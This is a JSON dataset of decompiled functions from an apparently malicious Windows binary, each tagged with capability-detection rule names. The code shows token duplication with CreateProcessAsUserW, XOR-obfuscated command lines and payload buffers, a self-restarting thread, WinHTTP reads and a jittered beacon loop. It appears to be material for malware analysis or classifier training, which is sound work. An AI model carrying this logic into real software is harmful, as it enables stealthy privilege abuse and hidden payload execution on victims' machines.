{
    "00401035": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401035(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    char *pcVar5;\n    uint s;\n    int32_t var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = *0x41bcc0;\n    puVar3 = \"abcdefghijklmnopqrstuvwxyz.-_1234567890\";\n    puVar4 = &s;\n    var_20h = param_2;\n    var_18h = param_1;\n    for (iVar2 = 10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    pcVar5 = str.QJJIX9.O;\n    var_4h = 0;\n    do {\n        var_10h = 1;\n        iVar2 = 0;\n        do {\n            if ((pcVar5[var_4h] != '\\0') && (iVar1 = (*_sym.imp.ntdll.dll_strchr)(&s, pcVar5[var_4h]),  iVar1 == 0)) {\n                var_10h = 0;\n                break;\n            }\n            iVar2 = iVar2 + 1;\n        } while (iVar2 < 0x20);\n        if (((*pcVar5 != '\\0') && (pcVar5[0x1f] == '\\0')) && (var_10h != 0)) {\n            var_10h = 0;\n            iVar2 = -1;\n            var_1ch = var_18h * 10;\n            do {\n                var_28h = 0;\n                var_24h = NULL;\n                var_8h = 0;\n                var_ch = 0;\n                iVar1 = fcn.00403f8c(var_1ch, 0, &var_ch, &var_8h);\n                if (iVar1 == 0) {\n                    if (var_8h == var_ch) {\n                        if (var_28h == 4) {\n                            iVar2 = *var_24h;\n                        }\n                        fcn.0040b172();\n                    }\n                    if (iVar2 != -1) goto code_r0x00401169;\n                }\n                else {\n                    (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n                }\n                var_10h = var_10h + 1;\n            } while (var_10h < 5);\n            if (iVar2 != -1) {\ncode_r0x00401169:\n                *var_20h = iVar2;\n                return var_4h;\n            }\n            var_14h = var_14h * 0x19660d + 0x3c6ef35f;\n            (*_sym.imp.KERNEL32.dll_Sleep)(var_14h % 600000 + 60000);\n        }\n        pcVar5 = pcVar5 + 0x20;\n        var_4h = var_4h + 1;\n        if (0x41ba4f < pcVar5) {\n            return -1;\n        }\n    } while( true );\n}\n",
        "token_count": 808
    },
    "0040117a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.0040117a(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint *puVar6;\n    char *pcVar7;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar4 = NULL;\n    puVar6 = &var_ch;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    if (((*in_ECX != 0) && (in_ECX[1] != 0)) && (iVar2 = fcn.004089ee(),  -1 < iVar2)) {\n        uVar3 = 0;\n        var_4h = 0x44444444;\n        if (var_ch != 4) {\n            do {\n                iVar2 = 0;\n                while (*(iVar2 + uVar3 + var_8h) == *(&var_4h + iVar2)) {\n                    iVar2 = iVar2 + 1;\n                    if (3 < iVar2) {\n                        pcVar4 = uVar3 + var_8h;\n                        goto code_r0x004011e3;\n                    }\n                }\n                uVar3 = uVar3 + 1;\n            } while (uVar3 < var_ch - 4U);\n        }\ncode_r0x004011e3:\n        if (pcVar4 != NULL) {\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.QJJIX9.O;\n            pcVar7 = pcVar4;\n            for (iVar2 = 0x184; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar7 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n                pcVar7 = pcVar7 + 1;\n            }\n            pcVar5 = pcVar4;\n            for (iVar2 = 0x140; pcVar1 = _sym.imp.KERNEL32.dll_lstrcpyA,  iVar2 != 0; iVar2 = iVar2 + -1) {\n                *pcVar5 = '\\0';\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = str.QJJIX9.O;\n            (*_sym.imp.KERNEL32.dll_lstrcpyA)(pcVar4, str.QJJIX9.O + arg_8h * 0x20);\n            do {\n                pcVar4 = pcVar4 + 0x20;\n                if (*pcVar5 != '\\0') {\n                    (*pcVar1)(pcVar4, pcVar5);\n                }\n                pcVar5 = pcVar5 + 0x20;\n            } while (pcVar5 < 0x41ba30);\n        }\n        fcn.0040b172();\n        *0x41baa4 = var_ch;\n        pcVar4 = 0x1;\n        *0x41baa8 = var_8h;\n    }\n    return pcVar4;\n}\n",
        "token_count": 769
    },
    "0040126d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401336)\n// WARNING: Removing unreachable block (ram,0x00401351)\n// WARNING: Removing unreachable block (ram,0x00401358)\n// WARNING: Removing unreachable block (ram,0x0040135f)\n// WARNING: Removing unreachable block (ram,0x00401378)\n\nuint __cdecl fcn.0040126d(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint32_t uStack420;\n    \n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201);\n    puVar3 = &stack0xfffffe50;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = 0x41baa4;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    iVar2 = fcn.0040b260();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41bd30);\n        (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    }\n    cVar1 = fcn.0040ac4d();\n    if ((cVar1 != '\\0') && (iVar2 = fcn.0040117a(0),  iVar2 != 0)) {\n        fcn.0040b172();\n        (*_sym.imp.KERNEL32.dll_SetEvent)(*0x41bd30);\n    }\n    while (*0x41bdf0 == 0) {\n        iVar2 = fcn.00401035();\n        if (iVar2 != -1) {\n            fcn.00403fd8();\n        }\n        uStack420 = uStack420 * 0x19660d + 0x3c6ef35f;\n        (*_sym.imp.KERNEL32.dll_Sleep)(uStack420 % 600000 + 60000);\n    }\n    return 0;\n}\n",
        "token_count": 500
    },
    "00402ca5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.00402ca5(uint param_1, int32_t *param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint lpCommandLine;\n    int32_t var_b0h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint TokenHandle;\n    int32_t var_58h;\n    uint pSessionId;\n    int32_t var_50h;\n    uint var_4ch;\n    uint pSid;\n    uint hExistingToken;\n    uint pIdentifierAuthority;\n    uint var_3ch;\n    int32_t *var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint hToken;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4ch = 4;\n    var_3ch._0_2_ = 0x1000;\n    piVar8 = param_2;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *piVar8 = 0;\n        piVar8 = piVar8 + 1;\n    }\n    pSessionId = 0;\n    puVar9 = &lpCommandLine;\n    var_38h = param_2;\n    for (iVar5 = 0x44; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hToken = 0;\n    puVar9 = &var_64h;\n    for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    hExistingToken = 0;\n    var_34h = 0;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    iVar5 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x2000000, 0, param_1);\n    if (iVar5 != 0) {\n        var_68h = iVar5;\n        iVar3 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(param_1, &pSessionId);\n        pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n        if (iVar3 != 0) {\n            iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(iVar5, 0x201eb, &hExistingToken);\n            if (iVar3 != 0) {\n                fcn.0040197b();\n                iVar3 = (*_sym.imp.ADVAPI32.dll_DuplicateTokenEx)(hExistingToken, 0x2000000, 0, 1, 1, &hToken);\n                pcVar2 = _sym.imp.ADVAPI32.dll_SetTokenInformation;\n                if (iVar3 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_SetTokenInformation)(hToken, 0xc, pSessionId, 4);\n                    iVar5 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                                      (&pIdentifierAuthority, 1, 0x4000, 0, 0, 0, 0, 0, 0, 0, &pSid);\n                    if (iVar5 != 0) {\n                        var_60h = 0x20;\n                        var_64h = pSid;\n                        iVar5 = (*_sym.imp.ADVAPI32.dll_GetLengthSid)(pSid);\n                        (*pcVar2)(hToken, 0x19, &var_64h, iVar5 + 8);\n                        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n                    }\n                    var_6ch = 0;\n                    (*pcVar2)(hToken, 0x1b, &var_6ch, 4);\n                    iVar5 = (*_sym.imp.USERENV.dll_CreateEnvironmentBlock)(&var_34h, hToken, 1);\n                    if (iVar5 == 0) {\n                        var_34h = 0;\n                    }\n                    else {\n                        var_4ch = 0x404;\n                    }\n                    lpCommandLine = 0x44;\n                    var_2ch = 0x6a3b3623;\n                    var_28h = 0x5435513c;\n                    var_24h = 0x520b5242;\n                    var_20h = 0x36084661;\n                    var_1ch = 0x51376a36;\n                    var_18h = 0x52575420;\n                    var_14h = 0x463d521f;\n                    var_10h = 0x6a523620;\n                    var_8h = 0x6a523654;\n                    var_4h._0_2_ = 0x5152;\n                    var_4h._2_1_ = 0x46;\n                    fcn.00401000(0x40);\n                    iVar5 = 0;\n                    var_58h = 7;\n                    var_30h = &var_2ch - var_50h;\n                    do {\n                        puVar1 = iVar5 + var_50h;\n                        iVar3 = iVar5 % 7;\n                        iVar5 = iVar5 + 1;\n                        *puVar1 = *(&var_8h + iVar3) ^ puVar1[var_30h];\n                    } while (iVar5 < 0x20);\n                    var_24h = 0x6c1c7a46;\n                    var_20h = 0x35245311;\n                    var_1ch = 0x721f6a15;\n                    var_18h = 0x7a1b4c27;\n                    var_14h = 0x530a6c0f;\n                    var_10h = 0x6a7a3529;\n                    var_8h = 0x6c6a7a35;\n                    var_4h._0_2_ = 0x5372;\n                    var_4h._2_1_ = 0x4c;\n                    fcn.00401000(0x30);\n                    iVar5 = var_30h;\n                    iVar3 = 0;\n                    do {\n                        puVar1 = iVar3 + var_30h;\n                        iVar6 = iVar3 % var_58h;\n                        iVar3 = iVar3 + 1;\n                        *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_24h - var_30h];\n                    } while (iVar3 < 0x18);\n                    var_88h._0_2_ = 0;\n                    var_b0h = var_50h;\n                    var_8ch = 1;\n                    (*_sym.imp.ADVAPI32.dll_CreateProcessAsUserW)\n                              (hToken, var_30h, 0, 0, 0, 0, var_4ch, var_34h, 0, &lpCommandLine, var_38h);\n                    pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    if (*var_38h != 0) {\n                        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(*var_38h, 0x201eb, &TokenHandle);\n                        if (iVar3 != 0) {\n                            fcn.0040197b();\n                            (*pcVar7)(TokenHandle);\n                        }\n                        (*pcVar7)(var_38h[1]);\n                    }\n                    if (var_34h != 0) {\n                        (*_sym.imp.USERENV.dll_DestroyEnvironmentBlock)(var_34h);\n                    }\n                    (*pcVar7)(hToken);\n                    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                    pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    uVar4 = (*pcVar2)(0, var_50h);\n                    (*pcVar7)(uVar4);\n                    pcVar7 = _sym.imp.KERNEL32.dll_CloseHandle;\n                    param_2 = var_38h;\n                    iVar5 = var_68h;\n                }\n                (*pcVar7)(hExistingToken);\n            }\n        }\n        (*pcVar7)(iVar5);\n    }\n    return *param_2;\n}\n",
        "token_count": 2027
    },
    "00402fb0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00402fb0(uint *param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint lpCommandLine;\n    uint var_94h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_3h;\n    \n    var_4ch = 0x62626d61;\n    var_48h = 0x5a32334b;\n    iVar6 = 0x44;\n    var_44h = 0x62546d30;\n    puVar8 = param_1;\n    for (iVar5 = 0x10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_40h = 0x5a13335f;\n    var_3ch = 0x625e6d2b;\n    puVar8 = &var_94h;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_94h = 0x44;\n    var_38h = 0x5a643346;\n    puVar8 = &lpCommandLine;\n    for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_34h = 0x62426d18;\n    var_30h = 0x5a32334b;\n    var_2ch = 0x62546d30;\n    var_28h = 0x5a72335f;\n    var_24h = 0x626d6d76;\n    var_20h = 0x5a373341;\n    var_1ch = 0x62596d27;\n    var_18h = 0x5a32335d;\n    var_14h = 0x621f6d30;\n    var_10h = 0x5a393357;\n    var_ch = 0x62316d21;\n    var_8h._0_1_ = 0x44;\n    stack0xfffffff5 = 0x3262316d;\n    var_3h._0_2_ = 0x4133;\n    var_3h._2_1_ = 0x5a;\n    fcn.00401000(0x88);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_50h;\n        uVar3 = uVar7 & 0x80000007;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_8h + uVar3) ^ puVar1[&var_4ch - var_50h];\n    } while (uVar7 < 0x44);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_50h, &lpCommandLine, 0x104);\n    (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, &lpCommandLine, 0, 0, 0, 0x800000c, 0, 0, &var_94h, param_1);\n    if (param_1[1] != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(param_1[1]);\n    }\n    uVar2 = *param_1;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_50h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return uVar2;\n}\n",
        "token_count": 1075
    },
    "00403108": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403108(uint arg_8h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    ushort uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int16_t *piVar6;\n    int32_t iVar7;\n    uint32_t uStack580;\n    uint uStack576;\n    int32_t iStack572;\n    ulong uStack568;\n    uint uStack560;\n    uint uStack556;\n    int32_t iStack552;\n    uint uStack548;\n    uchar auStack544 [16];\n    int16_t iStack528;\n    uchar auStack526 [522];\n    \n    uStack568 = 0;\n    uStack560 = 0;\n    uStack580 = 0;\n    uStack556 = 0;\n    iStack572 = 0;\n    auStack544 = ZEXT816(0);\n    iStack552 = 0;\n    uStack548 = 0;\n    iStack528 = 0;\n    sub.ntdll.dll_memset(auStack526, 0, 0x206);\n    if (*0x41bd40 == 0) {\n        *0x41baac = fcn.00402fb0();\n        uStack568._0_4_ = *0x41baa8;\n        iVar7 = *0x41baa4;\n    }\n    else {\n        *0x41baac = fcn.00402ca5();\n        iVar4 = fcn.00406008(&iStack572);\n        uStack568._0_4_ = uStack580;\n        iVar7 = iStack572;\n        if (iVar4 != 0) {\n            goto code_r0x004031d5;\n        }\n    }\n    uStack568._4_4_ = uStack568 >> 0x1f;\n    uStack568 = uStack568;\n    iStack552 = iVar7;\ncode_r0x004031d5:\n    iVar7 = iStack552;\n    if (*0x41baac == 0) {\n        piVar6 = &iStack528;\n        do {\n            iVar1 = *piVar6;\n            piVar6 = piVar6 + 1;\n        } while (iVar1 != 0);\n        if (piVar6 - auStack526 >> 1 != 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&iStack528);\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)(uVar3);\n        }\n    }\n    else {\n        fcn.004013cb();\n        if ((iVar7 != 0) && ((uStack568 | uStack568._4_4_) != 0)) {\n            fcn.0040af3f();\n            fcn.004074c9((*0x41bd38 & 1) << 4);\n        }\n        uStack580 = *0x41baac;\n        uStack576 = *0x41bd30;\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(2, &uStack580, 0, 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(*0x41baac, 0);\n        uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403108, arg_8h, 0, 0);\n        pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n        (*pcVar2)(*0x41baac);\n    }\n    (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 846
    },
    "004032ac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004032ac(uint noname_0, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint var_30ch;\n    uint var_104h;\n    \n    var_30ch._0_2_ = 0;\n    sub.ntdll.dll_memset(&var_30ch + 2, 0, 0x206);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (*0x41bd40 == 0) {\n        uVar6 = 0;\n        do {\n            if (*(uVar6 + 0x40fac0) == arg_ch) {\n                if (arg_10h == *0x41bd34) {\n                    return 1;\n                }\n                if (arg_ch == -0x37b0bf10) {\n                    puVar7 = &var_104h;\n                    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    var_104h._0_1_ = 0;\n                    if ((arg_14h != 0) &&\n                       (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x100410, 0, arg_14h),  iVar4 != 0)) {\n                        (*_sym.imp.PSAPI.DLL_GetProcessImageFileNameA)(iVar4, &var_104h, 0x104);\n                        (*pcVar1)(iVar4);\n                    }\n                    pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(&var_104h);\n                    if (iVar4 != 0) {\n                        (*pcVar2)(&var_104h);\n                        iVar4 = fcn.00406840();\n                        if (iVar4 == -0x37b0bf10) {\n                            return 1;\n                        }\n                    }\n                }\n                iVar4 = fcn.00401612();\n                if (iVar4 != 0) {\n                    return 1;\n                }\n                puVar7 = &var_30ch;\n                for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                iVar4 = fcn.004013cb();\n                if (iVar4 == 0) {\n                    return 1;\n                }\n                iVar4 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(&var_30ch, 0x41bab0);\n                if (iVar4 != 0) {\n                    return 1;\n                }\n                uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004018a3, arg_10h, 0, 0);\n                (*pcVar1)(uVar5);\n                return 1;\n            }\n            uVar6 = uVar6 + 4;\n        } while (uVar6 < 0x2c);\n    }\n    else if ((((arg_ch == 0x74fc6984) && (iVar4 = fcn.00401612(),  iVar4 == 0)) && (iVar4 = fcn.004013cb(),  iVar4 != 0)\n             ) && (iVar3 = (*_sym.imp.KERNEL32.dll_FindAtomW)(&var_30ch),  iVar3 == 0)) {\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(&var_30ch);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0xc);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n        *(iVar4 + 8) = arg_10h;\n        uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403108, iVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n    }\n    return 1;\n}\n",
        "token_count": 984
    },
    "00403619": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403619(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    \n    if (((*0x41bd40 == 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41bd30, 0xffffffff),  iVar2 == 0))\n       && (*arg_8h == 0x20)) {\n        puVar6 = 0x41bab0;\n        for (iVar2 = 0x208; pcVar1 = _sym.imp.KERNEL32.dll_GetCurrentProcessId,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        fcn.004013cb();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0xc);\n        piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        piVar4[1] = arg_8h[2];\n        *piVar4 = arg_8h[1];\n        iVar2 = (*pcVar1)();\n        piVar4[2] = iVar2;\n        uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403108, piVar4, 0, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    }\n    uVar5 = 0;\n    do {\n        *(uVar5 + 0x417220) = *(uVar5 + 0x417220) ^ *(uVar5 % 0xd + 0x417210);\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x4400);\n    uVar5 = 0;\n    do {\n        str.geu6RIBCgZ9jJTsj_[uVar5 + 0x10] = str.geu6RIBCgZ9jJTsj_[uVar5 + 0x10] ^ str.geu6RIBCgZ9jJTsj_[uVar5 & 0xf];\n        uVar5 = uVar5 + 1;\n    } while (uVar5 < 0x6200);\n    uVar3 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.00403478, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    while (*0x41bdf0 == 0) {\n        fcn.00408dcc();\n        if (*0x41bd40 != 0) {\n            (*pcVar1)(1000);\n        }\n        (*pcVar1)(0x1e);\n    }\n    return 0;\n}\n",
        "token_count": 692
    },
    "004037d6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004037d6(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\ncode_r0x00403814:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.00403f8c(in_EDX, 0, &arg_8h, &var_4h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x00403838:\n            fcn.0040b172();\n            goto code_r0x0040383f;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0040b172();\n            goto code_r0x00403814;\n        }\n        if (uVar1 < 5) goto code_r0x00403838;\n        if (*puVar2[1] == uVar1) {\ncode_r0x0040383f:\n            return *puVar2 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 318
    },
    "0040384f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040384f(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint lpdwNumberOfBytesRead;\n    uint lpdwNumberOfBytesAvailable;\n    \n    uVar1 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)();\n    if ((uVar1 == 0) || (uVar1 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)(),  uVar1 == 0)) {\n        uVar1 = uVar1 & 0xffffff00;\n    }\n    else {\n        *arg_8h = *arg_8h;\n        uVar1 = 1;\n    }\n    return uVar1;\n}\n",
        "token_count": 157
    },
    "004038a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
